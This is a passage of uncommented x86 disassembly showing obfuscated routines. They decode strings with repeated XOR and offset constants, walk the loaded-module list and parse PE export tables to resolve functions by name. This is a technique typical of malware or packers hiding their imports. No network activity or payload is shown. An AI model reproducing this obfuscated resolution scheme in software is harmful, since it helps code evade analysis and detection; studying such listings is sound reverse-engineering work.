  414277:	mov    si,WORD PTR [edi+esi*2]
  41427b:	mov    WORD PTR [ebp+0xc],si
  41427f:	mov    esi,0x72dd
  414284:	jmp    0x414391
  414289:	mov    edi,DWORD PTR [ebp-0x10]
  41428c:	mov    bx,WORD PTR [ebp+0xc]
  414290:	xor    edi,0x896
  414296:	add    edi,esi
  414298:	cmp    bx,di
  41429b:	je     0x4143bb
  4142a1:	mov    edi,DWORD PTR [ebp-0x10]
  4142a4:	mov    ebx,DWORD PTR [ebp+0x10]
  4142a7:	xor    edi,ecx
  4142a9:	add    edi,edx
  4142ab:	cmp    ebx,edi
  4142ad:	mov    di,WORD PTR [ebp+0xc]
  4142b1:	mov    bx,WORD PTR [ebp+0x8]
  4142b5:	je     0x414348
  4142bb:	cmp    bx,di
  4142be:	je     0x414351
  4142c4:	mov    di,WORD PTR [ebp-0x4]
  4142c8:	mov    ebx,0x8a89
  4142cd:	xor    di,bx
  4142d0:	mov    bx,WORD PTR [ebp+0x8]
  4142d4:	add    di,ax
  4142d7:	cmp    bx,di
  4142da:	jb     0x414302
  4142dc:	mov    di,WORD PTR [ebp-0x8]
  4142e0:	mov    ebx,0x8a89
  4142e5:	xor    di,bx
  4142e8:	mov    bx,WORD PTR [ebp+0x8]
  4142ec:	add    di,ax
  4142ef:	cmp    bx,di
  4142f2:	ja     0x414302
  4142f4:	movzx  edi,WORD PTR [ebp+0x8]
  4142f8:	movzx  ebx,WORD PTR [ebp-0xc]
  4142fc:	add    edi,ebx
  4142fe:	mov    WORD PTR [ebp+0x8],di
  414302:	mov    di,WORD PTR [ebp-0x4]
  414306:	mov    ebx,0x8a89
  41430b:	xor    di,bx
  41430e:	mov    bx,WORD PTR [ebp+0xc]
  414312:	add    di,ax
  414315:	cmp    bx,di
  414318:	jb     0x414340
  41431a:	mov    di,WORD PTR [ebp-0x8]
  41431e:	mov    ebx,0x8a89
  414323:	xor    di,bx
  414326:	mov    bx,WORD PTR [ebp+0xc]
  41432a:	add    di,ax
  41432d:	cmp    bx,di
  414330:	ja     0x414340
  414332:	movzx  edi,WORD PTR [ebp+0xc]
  414336:	movzx  ebx,WORD PTR [ebp-0xc]
  41433a:	add    edi,ebx
  41433c:	mov    WORD PTR [ebp+0xc],di
  414340:	mov    di,WORD PTR [ebp+0xc]
  414344:	mov    bx,WORD PTR [ebp+0x8]
  414348:	cmp    bx,di
  41434b:	jne    0x41440c
  414351:	mov    edi,DWORD PTR [ebp-0x28]
  414354:	mov    ebx,DWORD PTR [ebp-0x14]
  414357:	xor    edi,ecx
  414359:	lea    edi,[edi+ebx*1+0x3272dd]
  414360:	mov    DWORD PTR [ebp-0x14],edi
  414363:	mov    edi,DWORD PTR [ebp-0x28]
  414366:	mov    ebx,DWORD PTR [ebp-0x18]
  414369:	xor    edi,ecx
  41436b:	lea    edi,[edi+ebx*1+0x3272dd]
  414372:	mov    DWORD PTR [ebp-0x18],edi
  414375:	mov    edi,DWORD PTR [ebp-0x20]
  414378:	mov    ebx,DWORD PTR [ebp-0x14]
  41437b:	mov    di,WORD PTR [ebx+edi*2]
  41437f:	mov    WORD PTR [ebp+0x8],di
  414383:	mov    edi,DWORD PTR [ebp-0x24]
  414386:	mov    ebx,DWORD PTR [ebp-0x18]
  414389:	mov    di,WORD PTR [ebx+edi*2]
  41438d:	mov    WORD PTR [ebp+0xc],di
  414391:	mov    edi,DWORD PTR [ebp-0x10]
  414394:	mov    bx,WORD PTR [ebp+0x8]
  414398:	xor    edi,0x896
  41439e:	add    edi,esi
  4143a0:	cmp    bx,di
  4143a3:	jne    0x414289
  4143a9:	mov    esi,DWORD PTR [ebp-0x1c]
  4143ac:	xor    esi,ecx
  4143ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4143b1:	add    esi,edx
  4143b3:	imul   esi,ecx
  4143b6:	mov    DWORD PTR [ebp-0x10],esi
  4143b9:	jmp    0x4143cd
  4143bb:	mov    edx,DWORD PTR [ebp-0x10]
  4143be:	xor    edx,ecx
  4143c0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4143c3:	lea    ecx,[edx+ecx*1+0x3272dd]
  4143ca:	mov    DWORD PTR [ebp-0x1c],ecx
  4143cd:	mov    edx,DWORD PTR [ebp-0x20]
  4143d0:	mov    esi,DWORD PTR [ebp-0x14]
  4143d3:	mov    si,WORD PTR [esi+edx*2]
  4143d7:	mov    ecx,eax
  4143d9:	sub    si,cx
  4143dc:	mov    edx,0x8a89
  4143e1:	xor    si,dx
  4143e4:	mov    ecx,0x4e3d
  4143e9:	cmp    si,cx
  4143ec:	jne    0x414407
  4143ee:	mov    esi,DWORD PTR [ebp-0x24]
  4143f1:	mov    edi,DWORD PTR [ebp-0x18]
  4143f4:	mov    si,WORD PTR [edi+esi*2]
  4143f8:	sub    si,ax
  4143fb:	xor    si,dx
  4143fe:	cmp    si,cx
  414401:	jne    0x414407
  414403:	xor    eax,eax
  414405:	jmp    0x414413
  414407:	xor    eax,eax
  414409:	inc    eax
  41440a:	jmp    0x414413
  41440c:	mov    eax,DWORD PTR [ebp-0x1c]
  41440f:	xor    eax,ecx
  414411:	add    eax,edx
  414413:	pop    edi
  414414:	pop    esi
  414415:	pop    ebx
  414416:	leave  
  414417:	ret    0xc
  41441a:	push   ebp
  41441b:	mov    ebp,esp
  41441d:	push   ecx
  41441e:	mov    cx,WORD PTR [eax]
  414421:	push   esi
  414422:	mov    esi,0x3b4c
  414427:	sub    cx,si
  41442a:	mov    esi,0x8a89
  41442f:	xor    cx,si
  414432:	mov    esi,0x4e3d
  414437:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41443e:	mov    edx,0xf89c85b5
  414443:	cmp    cx,si
  414446:	je     0x4144a5
  414448:	push   ebx
  414449:	push   edi
  41444a:	movzx  ecx,cx
  41444d:	mov    edi,0xffcd8d23
  414452:	mov    esi,0x7510896
  414457:	mov    ebx,0x4f99
  41445c:	cmp    cx,bx
  41445f:	jne    0x414464
  414461:	mov    DWORD PTR [ebp-0x4],edx
  414464:	lea    edx,[edi+0x1]
  414467:	xor    edx,esi
  414469:	mov    edi,edx
  41446b:	xor    edi,esi
  41446d:	mov    cx,WORD PTR [eax+edi*2+0x64e5ba]
  414475:	mov    ebx,0x3b4c
  41447a:	sub    cx,bx
  41447d:	mov    ebx,0x8a89
  414482:	xor    cx,bx
  414485:	mov    ebx,0x4e3d
  41448a:	cmp    cx,bx
  41448d:	jne    0x414457
  41448f:	mov    ecx,DWORD PTR [ebp-0x4]
  414492:	pop    edi
  414493:	pop    ebx
  414494:	cmp    ecx,0xf89c85b4
  41449a:	je     0x4144a5
  41449c:	xor    ecx,esi
  41449e:	lea    eax,[eax+ecx*2+0x64e5bc]
  4144a5:	pop    esi
  4144a6:	leave  
  4144a7:	ret    
  4144a8:	push   ebp
  4144a9:	mov    ebp,esp
  4144ab:	push   ecx
  4144ac:	push   esi
  4144ad:	push   edi
  4144ae:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  4144b5:	mov    esi,0xf89c85b5
  4144ba:	call   0x41441a
  4144bf:	mov    edi,eax
  4144c1:	mov    al,BYTE PTR [edi]
  4144c3:	add    al,0xb
  4144c5:	xor    al,0x71
  4144c7:	cmp    al,0x7a
  4144c9:	je     0x41452c
  4144cb:	mov    eax,edi
  4144cd:	mov    edx,0xffcd8d23
  4144d2:	mov    ecx,0x7510896
  4144d7:	push   ebx
  4144d8:	mov    ax,WORD PTR [eax]
  4144db:	mov    ebx,0x3b4c
  4144e0:	sub    ax,bx
  4144e3:	mov    ebx,0x8a89
  4144e8:	xor    ax,bx
  4144eb:	mov    ebx,0x4e6b
  4144f0:	cmp    ax,bx
  4144f3:	jne    0x4144f8
  4144f5:	mov    DWORD PTR [ebp-0x4],esi
  4144f8:	lea    esi,[edx+0x1]
  4144fb:	xor    esi,ecx
  4144fd:	mov    edx,esi
  4144ff:	xor    edx,ecx
  414501:	lea    eax,[edi+edx*2+0x64e5ba]
  414508:	mov    bl,BYTE PTR [eax]
  41450a:	add    bl,0xb
  41450d:	xor    bl,0x71
  414510:	cmp    bl,0x7a
  414513:	jne    0x4144d8
  414515:	mov    eax,DWORD PTR [ebp-0x4]
  414518:	pop    ebx
  414519:	cmp    eax,0xf89c85b4
  41451e:	je     0x41452c
  414520:	xor    eax,ecx
  414522:	xor    ecx,ecx
  414524:	mov    WORD PTR [edi+eax*2+0x64e5ba],cx
  41452c:	mov    eax,edi
  41452e:	pop    edi
  41452f:	pop    esi
  414530:	leave  
  414531:	ret    
  414532:	push   ebp
  414533:	mov    ebp,esp
  414535:	push   ecx
  414536:	push   esi
  414537:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41453e:	mov    esi,0xf89c85b5
  414543:	call   0x41441a
  414548:	mov    cx,WORD PTR [eax]
  41454b:	mov    edx,0x3b4c
  414550:	sub    cx,dx
  414553:	mov    edx,0x8a89
  414558:	xor    cx,dx
  41455b:	mov    edx,0x4e3d
  414560:	cmp    cx,dx
  414563:	je     0x4145bc
  414565:	push   ebx
  414566:	push   edi
  414567:	movzx  ecx,cx
  41456a:	mov    edx,0xffcd8d23
  41456f:	mov    edi,0x7510896
  414574:	mov    ebx,0x4e6b
  414579:	cmp    cx,bx
  41457c:	jne    0x414581
  41457e:	mov    DWORD PTR [ebp-0x4],esi
  414581:	lea    esi,[edx+0x1]
  414584:	xor    esi,edi
  414586:	mov    edx,esi
  414588:	xor    edx,edi
  41458a:	mov    cx,WORD PTR [eax+edx*2+0x64e5ba]
  414592:	mov    ebx,0x3b4c
  414597:	sub    cx,bx
  41459a:	mov    ebx,0x8a89
  41459f:	xor    cx,bx
  4145a2:	mov    ebx,0x4e3d
  4145a7:	cmp    cx,bx
  4145aa:	jne    0x414574
  4145ac:	cmp    DWORD PTR [ebp-0x4],0xf89c85b4
  4145b3:	pop    edi
  4145b4:	pop    ebx
  4145b5:	je     0x4145bc
  4145b7:	xor    eax,eax
  4145b9:	inc    eax
  4145ba:	jmp    0x4145be
  4145bc:	xor    eax,eax
  4145be:	pop    esi
  4145bf:	leave  
  4145c0:	ret    
  4145c1:	push   ebp
  4145c2:	mov    ebp,esp
  4145c4:	push   ecx
  4145c5:	mov    eax,DWORD PTR [ebp+0x8]
  4145c8:	movzx  ecx,WORD PTR [eax]
  4145cb:	push   esi
  4145cc:	lea    eax,[ecx-0x3b4c]
  4145d2:	mov    esi,0x8a89
  4145d7:	push   edi
  4145d8:	xor    eax,esi
  4145da:	mov    edi,0x4e3d
  4145df:	mov    DWORD PTR [ebp-0x4],edx
  4145e2:	cmp    ax,di
  4145e5:	je     0x414612
  4145e7:	mov    eax,DWORD PTR [ebp+0x8]
  4145ea:	sub    eax,edx
  4145ec:	mov    DWORD PTR [ebp+0x8],eax
  4145ef:	jmp    0x4145f4
  4145f1:	mov    eax,DWORD PTR [ebp+0x8]
  4145f4:	mov    WORD PTR [edx],cx
  4145f7:	add    edx,0x2
  4145fa:	movzx  edi,WORD PTR [eax+edx*1]
  4145fe:	mov    ecx,edi
  414600:	add    edi,0xffffc4b4
  414606:	xor    edi,esi
  414608:	mov    eax,0x4e3d
  41460d:	cmp    di,ax
  414610:	jne    0x4145f1
  414612:	xor    eax,eax
  414614:	pop    edi
  414615:	mov    WORD PTR [edx],ax
  414618:	mov    eax,DWORD PTR [ebp-0x4]
  41461b:	pop    esi
  41461c:	leave  
  41461d:	ret    0x4
  414620:	push   ebp
  414621:	mov    ebp,esp
  414623:	sub    esp,0x18
  414626:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  41462d:	mov    DWORD PTR [ebp-0x18],0xf89c85b2
  414634:	mov    eax,DWORD PTR [ebp-0x14]
  414637:	xor    eax,0x7510896
  41463c:	add    eax,0x3272dd
  414641:	mov    DWORD PTR [ebp-0x8],eax
  414644:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41464b:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  414652:	mov    DWORD PTR [ebp-0x4],0xf89c85b3
  414659:	mov    eax,DWORD PTR [ebp-0x14]
  41465c:	xor    eax,0x7510896
  414661:	mov    ecx,DWORD PTR [ebp-0x8]
  414664:	lea    eax,[ecx+eax*1+0x3272dd]
  41466b:	mov    ecx,DWORD PTR [ebp-0x18]
  41466e:	xor    ecx,0x7510896
  414674:	add    ecx,0x3272dd
  41467a:	mov    edx,DWORD PTR [ebp+0x10]
  41467d:	imul   edx,ecx
  414680:	cmp    eax,edx
  414682:	jae    0x414775
  414688:	mov    eax,DWORD PTR [ebp+0x10]
  41468b:	mov    ecx,DWORD PTR [ebp-0x8]
  41468e:	sub    eax,ecx
  414690:	mov    ecx,DWORD PTR [ebp-0x10]
  414693:	xor    ecx,0x7510896
  414699:	add    ecx,0x3272dd
  41469f:	cmp    eax,ecx
  4146a1:	jbe    0x4146d3
  4146a3:	mov    eax,DWORD PTR [ebp+0x8]
  4146a6:	add    eax,DWORD PTR [ebp-0x8]
  4146a9:	mov    ecx,DWORD PTR [ebp+0xc]
  4146ac:	add    ecx,DWORD PTR [ebp-0x8]
  4146af:	mov    edx,DWORD PTR [ecx]
  4146b1:	mov    DWORD PTR [eax],edx
  4146b3:	mov    ecx,DWORD PTR [ecx+0x4]
  4146b6:	mov    DWORD PTR [eax+0x4],ecx
  4146b9:	mov    eax,DWORD PTR [ebp-0x10]
  4146bc:	xor    eax,0x7510896
  4146c1:	mov    ecx,DWORD PTR [ebp-0x8]
  4146c4:	lea    eax,[ecx+eax*1+0x3272dd]
  4146cb:	mov    DWORD PTR [ebp-0x8],eax
  4146ce:	jmp    0x414770
  4146d3:	mov    eax,DWORD PTR [ebp+0x10]
  4146d6:	mov    ecx,DWORD PTR [ebp-0x8]
  4146d9:	sub    eax,ecx
  4146db:	mov    ecx,DWORD PTR [ebp-0xc]
  4146de:	xor    ecx,0x7510896
  4146e4:	add    ecx,0x3272dd
  4146ea:	cmp    eax,ecx
  4146ec:	jbe    0x414715
  4146ee:	mov    eax,DWORD PTR [ebp+0x8]
  4146f1:	add    eax,DWORD PTR [ebp-0x8]
  4146f4:	mov    ecx,DWORD PTR [ebp+0xc]
  4146f7:	add    ecx,DWORD PTR [ebp-0x8]
  4146fa:	mov    ecx,DWORD PTR [ecx]
  4146fc:	mov    DWORD PTR [eax],ecx
  4146fe:	mov    eax,DWORD PTR [ebp-0xc]
  414701:	xor    eax,0x7510896
  414706:	mov    ecx,DWORD PTR [ebp-0x8]
  414709:	lea    eax,[ecx+eax*1+0x3272dd]
  414710:	mov    DWORD PTR [ebp-0x8],eax
  414713:	jmp    0x414770
  414715:	mov    eax,DWORD PTR [ebp+0x10]
  414718:	mov    ecx,DWORD PTR [ebp-0x8]
  41471b:	sub    eax,ecx
  41471d:	mov    ecx,DWORD PTR [ebp-0x4]
  414720:	xor    ecx,0x7510896
  414726:	add    ecx,0x3272dd
  41472c:	cmp    eax,ecx
  41472e:	jbe    0x414759
  414730:	mov    eax,DWORD PTR [ebp+0x8]
  414733:	add    eax,DWORD PTR [ebp-0x8]
  414736:	mov    ecx,DWORD PTR [ebp+0xc]
  414739:	add    ecx,DWORD PTR [ebp-0x8]
  41473c:	mov    cx,WORD PTR [ecx]
  41473f:	mov    WORD PTR [eax],cx
  414742:	mov    eax,DWORD PTR [ebp-0x4]
  414745:	xor    eax,0x7510896
  41474a:	mov    ecx,DWORD PTR [ebp-0x8]
  41474d:	lea    eax,[ecx+eax*1+0x3272dd]
  414754:	mov    DWORD PTR [ebp-0x8],eax
  414757:	jmp    0x414770
  414759:	mov    eax,DWORD PTR [ebp+0x8]
  41475c:	add    eax,DWORD PTR [ebp-0x8]
  41475f:	mov    ecx,DWORD PTR [ebp+0xc]
  414762:	add    ecx,DWORD PTR [ebp-0x8]
  414765:	mov    cl,BYTE PTR [ecx]
  414767:	mov    BYTE PTR [eax],cl
  414769:	mov    eax,DWORD PTR [ebp-0x8]
  41476c:	inc    eax
  41476d:	mov    DWORD PTR [ebp-0x8],eax
  414770:	jmp    0x414659
  414775:	leave  
  414776:	ret    0xc
  414779:	push   ebp
  41477a:	mov    ebp,esp
  41477c:	push   ecx
  41477d:	push   ecx
  41477e:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  414785:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  41478c:	xor    eax,eax
  41478e:	inc    eax
  41478f:	je     0x4147d1
  414791:	mov    eax,DWORD PTR [ebp-0x4]
  414794:	xor    eax,0x7510896
  414799:	add    eax,0x3272dd
  41479e:	cmp    DWORD PTR [ebp+0xc],eax
  4147a1:	jne    0x4147a5
  4147a3:	jmp    0x4147d1
  4147a5:	mov    eax,DWORD PTR [ebp-0x8]
  4147a8:	xor    eax,0x7510896
  4147ad:	add    eax,0x3272dd
  4147b2:	mov    ecx,DWORD PTR [ebp+0xc]
  4147b5:	sub    ecx,eax
  4147b7:	mov    DWORD PTR [ebp+0xc],ecx
  4147ba:	mov    eax,DWORD PTR [ebp-0x4]
  4147bd:	xor    eax,0x7510896
  4147c2:	add    eax,0x3272dd
  4147c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4147ca:	add    ecx,DWORD PTR [ebp+0xc]
  4147cd:	mov    BYTE PTR [ecx],al
  4147cf:	jmp    0x41478c
  4147d1:	leave  
  4147d2:	ret    0x8
  4147d5:	push   ebp
  4147d6:	mov    ebp,esp
  4147d8:	sub    esp,0x21c
  4147de:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4147e5:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  4147ec:	mov    eax,DWORD PTR [ebp+0x10]
  4147ef:	mov    eax,DWORD PTR [ebp-0x4]
  4147f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4147f5:	push   esi
  4147f6:	push   edi
  4147f7:	mov    edi,0x7510896
  4147fc:	xor    eax,edi
  4147fe:	mov    esi,0x3272dd
  414803:	add    eax,esi
  414805:	cmp    eax,ecx
  414807:	mov    eax,DWORD PTR [ebp-0x4]
  41480a:	jne    0x414815
  41480c:	xor    eax,edi
  41480e:	add    eax,esi
  414810:	jmp    0x4148c1
  414815:	mov    ecx,DWORD PTR [ebp+0xc]
  414818:	xor    eax,edi
  41481a:	add    eax,esi
  41481c:	cmp    eax,ecx
  41481e:	jne    0x414825
  414820:	mov    eax,DWORD PTR [ebp-0x4]
  414823:	jmp    0x41480c
  414825:	lea    eax,[ebp-0x21c]
  41482b:	mov    DWORD PTR [ebp-0x8],eax
  41482e:	mov    eax,DWORD PTR [ebp+0xc]
  414831:	mov    DWORD PTR [ebp-0x10],eax
  414834:	mov    eax,DWORD PTR [ebp-0x4]
  414837:	xor    eax,edi
  414839:	add    eax,esi
  41483b:	mov    DWORD PTR [ebp+0x10],eax
  41483e:	mov    eax,DWORD PTR [ebp+0xc]
  414841:	push   ebx
  414842:	call   0x414532
  414847:	mov    ebx,eax
  414849:	mov    eax,DWORD PTR [ebp+0x8]
  41484c:	mov    eax,DWORD PTR [eax+0x14]
  41484f:	jmp    0x4148a9
  414851:	mov    eax,DWORD PTR [ebp+0xc]
  414854:	sub    eax,0x8
  414857:	mov    DWORD PTR [ebp-0xc],eax
  41485a:	mov    eax,DWORD PTR [ebp-0xc]
  41485d:	mov    eax,DWORD PTR [eax+0x28]
  414860:	call   0x41441a
  414865:	mov    DWORD PTR [ebp+0x10],eax
  414868:	push   DWORD PTR [ebp+0x10]
  41486b:	mov    edx,DWORD PTR [ebp-0x8]
  41486e:	call   0x4145c1
  414873:	mov    eax,DWORD PTR [ebp-0x4]
  414876:	xor    eax,edi
  414878:	add    eax,esi
  41487a:	cmp    eax,ebx
  41487c:	jne    0x414886
  41487e:	mov    eax,DWORD PTR [ebp-0x8]
  414881:	call   0x4144a8
  414886:	mov    eax,DWORD PTR [ebp-0x14]
  414889:	xor    eax,edi
  41488b:	add    eax,esi
  41488d:	push   eax
  41488e:	push   DWORD PTR [ebp-0x10]
  414891:	push   DWORD PTR [ebp-0x8]
  414894:	call   0x4141ac
  414899:	mov    ecx,DWORD PTR [ebp-0x4]
  41489c:	xor    ecx,edi
  41489e:	add    ecx,esi
  4148a0:	cmp    eax,ecx
  4148a2:	je     0x4148c7
  4148a4:	mov    eax,DWORD PTR [ebp+0xc]
  4148a7:	mov    eax,DWORD PTR [eax]
  4148a9:	mov    DWORD PTR [ebp+0xc],eax
  4148ac:	mov    eax,DWORD PTR [ebp+0x8]
  4148af:	mov    ecx,DWORD PTR [ebp+0xc]
  4148b2:	add    eax,0x14
  4148b5:	cmp    ecx,eax
  4148b7:	jne    0x414851
  4148b9:	mov    eax,DWORD PTR [ebp-0x4]
  4148bc:	xor    eax,edi
  4148be:	add    eax,esi
  4148c0:	pop    ebx
  4148c1:	pop    edi
  4148c2:	pop    esi
  4148c3:	leave  
  4148c4:	ret    0xc
  4148c7:	mov    eax,DWORD PTR [ebp-0xc]
  4148ca:	mov    eax,DWORD PTR [eax+0x18]
  4148cd:	jmp    0x4148c0
  4148cf:	push   ebp
  4148d0:	mov    ebp,esp
  4148d2:	mov    eax,DWORD PTR [ebp+0xc]
  4148d5:	sub    esp,0x10
  4148d8:	cmp    DWORD PTR [ebp+0x8],0x0
  4148dc:	push   ebx
  4148dd:	push   esi
  4148de:	push   edi
  4148df:	je     0x414994
  4148e5:	test   eax,eax
  4148e7:	je     0x414994
  4148ed:	movzx  eax,WORD PTR [eax+0x20]
  4148f1:	mov    ecx,eax
  4148f3:	mov    DWORD PTR [ebp-0x10],eax
  4148f6:	xor    edx,edx
  4148f8:	and    DWORD PTR [ebp-0x8],edx
  4148fb:	mov    eax,0x8a89
  414900:	xor    ecx,eax
  414902:	add    ecx,0x3b4c
  414908:	mov    DWORD PTR [ebp-0xc],ecx
  41490b:	and    DWORD PTR [ebp-0x4],0x0
  41490f:	xor    ecx,ecx
  414911:	push   0x7c
  414913:	pop    edi
  414914:	cmp    cx,WORD PTR [ebp-0xc]
  414918:	jae    0x41497e
  41491a:	lea    esi,[edx-0x3b4c]
  414920:	xor    esi,eax
  414922:	movzx  ecx,WORD PTR [ebp-0x4]
  414926:	mov    ebx,DWORD PTR [ebp+0xc]
  414929:	lea    ecx,[ebx+ecx*4]
  41492c:	cmp    WORD PTR [ecx+0x2],si
  414930:	jne    0x414969
  414932:	movzx  ecx,WORD PTR [ecx]
  414935:	mov    edi,0x4e3d
  41493a:	cmp    cx,di
  41493d:	jne    0x41494b
  41493f:	mov    ebx,DWORD PTR [ebp+0x8]
  414942:	movzx  edi,dx
  414945:	cmp    BYTE PTR [edi+ebx*1],0x0
  414949:	je     0x414978
  41494b:	mov    ebx,DWORD PTR [ebp+0x8]
  41494e:	movzx  edi,dx
  414951:	movsx  di,BYTE PTR [edi+ebx*1]
  414956:	mov    ebx,0x3b4c
  41495b:	sub    di,bx
  41495e:	xor    di,ax
  414961:	cmp    cx,di
  414964:	je     0x414978
  414966:	push   0x7a
  414968:	pop    edi
  414969:	inc    DWORD PTR [ebp-0x4]
  41496c:	mov    cx,WORD PTR [ebp-0xc]
  414970:	cmp    WORD PTR [ebp-0x4],cx
  414974:	jb     0x414922
  414976:	jmp    0x41497e
  414978:	inc    DWORD PTR [ebp-0x8]
  41497b:	push   0x7d
  41497d:	pop    edi
  41497e:	mov    esi,DWORD PTR [ebp+0x8]
  414981:	movzx  ecx,dx
  414984:	cmp    BYTE PTR [ecx+esi*1],0x0
  414988:	je     0x41499d
  41498a:	inc    edx
  41498b:	cmp    edi,0x7a
  41498e:	jne    0x41490b
  414994:	xor    eax,eax
  414996:	pop    edi
  414997:	pop    esi
  414998:	pop    ebx
  414999:	leave  
  41499a:	ret    0x8
  41499d:	mov    ecx,DWORD PTR [ebp-0x8]
  4149a0:	add    ecx,0xffffc4b4
  4149a6:	xor    cx,ax
  4149a9:	xor    eax,eax
  4149ab:	cmp    cx,WORD PTR [ebp-0x10]
  4149af:	sete   al
  4149b2:	jmp    0x414996
  4149b4:	push   ebp
  4149b5:	mov    ebp,esp
  4149b7:	sub    esp,0x50
  4149ba:	push   edi
  4149bb:	mov    edi,eax
  4149bd:	mov    eax,DWORD PTR [edi+0x1a8]
  4149c3:	cmp    DWORD PTR [eax],0x0
  4149c6:	jne    0x4149cf
  4149c8:	xor    eax,eax
  4149ca:	jmp    0x414aff
  4149cf:	push   0x2c
  4149d1:	push   DWORD PTR [ebp+0x8]
  4149d4:	call   0x414779
  4149d9:	mov    edx,DWORD PTR [edi+0x1ac]
  4149df:	lea    eax,[edi+0x22]
  4149e2:	mov    DWORD PTR [ebp-0x4c],eax
  4149e5:	lea    eax,[edi+0x44]
  4149e8:	mov    DWORD PTR [ebp-0x48],eax
  4149eb:	lea    eax,[edi+0x66]
  4149ee:	mov    DWORD PTR [ebp-0x44],eax
  4149f1:	lea    eax,[edi+0x88]
  4149f7:	mov    DWORD PTR [ebp-0x40],eax
  4149fa:	lea    eax,[edi+0xaa]
  414a00:	mov    DWORD PTR [ebp-0x3c],eax
  414a03:	lea    eax,[edi+0xcc]
  414a09:	mov    DWORD PTR [ebp-0x38],eax
  414a0c:	lea    eax,[edi+0xee]
  414a12:	mov    DWORD PTR [ebp-0x34],eax
  414a15:	lea    eax,[edi+0x110]
  414a1b:	mov    DWORD PTR [ebp-0x30],eax
  414a1e:	lea    eax,[edi+0x132]
  414a24:	mov    DWORD PTR [ebp-0x2c],eax
  414a27:	lea    eax,[edi+0x154]
  414a2d:	push   edi
  414a2e:	mov    DWORD PTR [ebp-0x50],edi
  414a31:	mov    DWORD PTR [ebp-0x28],eax
  414a34:	call   0x414b33
  414a39:	push   eax
  414a3a:	mov    eax,DWORD PTR [edi+0x1a8]
  414a40:	push   DWORD PTR [eax]
  414a42:	call   0x4147d5
  414a47:	mov    DWORD PTR [ebp-0x10],eax
  414a4a:	test   eax,eax
  414a4c:	je     0x414aff
  414a52:	mov    ecx,DWORD PTR [eax+0x3c]
  414a55:	push   ebx
  414a56:	push   esi
  414a57:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  414a5b:	add    esi,eax
  414a5d:	mov    edi,DWORD PTR [esi+0x24]
  414a60:	mov    ecx,DWORD PTR [esi+0x1c]
  414a63:	mov    edx,DWORD PTR [esi+0x20]
  414a66:	mov    ebx,DWORD PTR [esi+0x18]
  414a69:	add    edi,eax
  414a6b:	mov    DWORD PTR [ebp-0x20],edi
  414a6e:	mov    edi,DWORD PTR [esi+0x14]
  414a71:	add    ecx,eax
  414a73:	add    edx,eax
  414a75:	mov    DWORD PTR [ebp-0xc],ecx
  414a78:	mov    DWORD PTR [ebp-0x1c],edx
  414a7b:	mov    DWORD PTR [ebp-0x8],edi
  414a7e:	cmp    edi,ebx
  414a80:	ja     0x414a85
  414a82:	mov    DWORD PTR [ebp-0x8],ebx
  414a85:	xor    ebx,ebx
  414a87:	mov    DWORD PTR [ebp-0x18],ebx
  414a8a:	cmp    DWORD PTR [ebp-0x8],ebx
  414a8d:	jbe    0x414afd
  414a8f:	jmp    0x414a94
  414a91:	mov    edx,DWORD PTR [ebp-0x1c]
  414a94:	mov    edi,DWORD PTR [ebp-0x20]
  414a97:	movzx  edi,WORD PTR [edi+ebx*2]
  414a9b:	cmp    ebx,DWORD PTR [esi+0x18]
  414a9e:	jae    0x414afd
  414aa0:	cmp    edi,DWORD PTR [esi+0x14]
  414aa3:	jae    0x414afd
  414aa5:	mov    ebx,DWORD PTR [edx+ebx*4]
  414aa8:	mov    edx,DWORD PTR [ebp+0x8]
  414aab:	mov    edi,DWORD PTR [ecx+edi*4]
  414aae:	mov    DWORD PTR [ebp-0x4],edx
  414ab1:	lea    edx,[ebp-0x50]
  414ab4:	add    ebx,eax
  414ab6:	add    edi,eax
  414ab8:	sub    edx,DWORD PTR [ebp+0x8]
  414abb:	mov    DWORD PTR [ebp-0x14],0xb
  414ac2:	mov    DWORD PTR [ebp-0x24],edx
  414ac5:	mov    edx,DWORD PTR [ebp-0x4]
  414ac8:	cmp    DWORD PTR [edx],0x0
  414acb:	jne    0x414ae8
  414acd:	mov    eax,DWORD PTR [ebp-0x24]
  414ad0:	push   DWORD PTR [eax+edx*1]
  414ad3:	push   ebx
  414ad4:	call   0x4148cf
  414ad9:	mov    ecx,DWORD PTR [ebp-0xc]
  414adc:	test   eax,eax
  414ade:	je     0x414ae5
  414ae0:	mov    eax,DWORD PTR [ebp-0x4]
  414ae3:	mov    DWORD PTR [eax],edi
  414ae5:	mov    eax,DWORD PTR [ebp-0x10]
  414ae8:	add    DWORD PTR [ebp-0x4],0x4
  414aec:	dec    DWORD PTR [ebp-0x14]
  414aef:	jne    0x414ac5
  414af1:	mov    ebx,DWORD PTR [ebp-0x18]
  414af4:	inc    ebx
  414af5:	mov    DWORD PTR [ebp-0x18],ebx
  414af8:	cmp    ebx,DWORD PTR [ebp-0x8]
  414afb:	jb     0x414a91
  414afd:	pop    esi
  414afe:	pop    ebx
  414aff:	pop    edi
  414b00:	leave  
  414b01:	ret    0x4
  414b04:	push   ebp
  414b05:	mov    ebp,esp
  414b07:	mov    eax,DWORD PTR [ebp+0x8]
  414b0a:	push   esi
  414b0b:	push   DWORD PTR [eax+0x1d8]
  414b11:	lea    esi,[eax+0x198]
  414b17:	mov    eax,DWORD PTR [ebp+0x8]
  414b1a:	call   0x4149b4
  414b1f:	mov    ecx,DWORD PTR [esi]
  414b21:	mov    DWORD PTR [ecx],eax
  414b23:	mov    eax,DWORD PTR [esi]
  414b25:	xor    ecx,ecx
  414b27:	cmp    DWORD PTR [eax],ecx
  414b29:	pop    esi
  414b2a:	setne  cl
  414b2d:	mov    eax,ecx
  414b2f:	pop    ebp
  414b30:	ret    0x4
  414b33:	mov    ecx,DWORD PTR [edi+0x188]
  414b39:	push   ebx
  414b3a:	jmp    0x414b4f
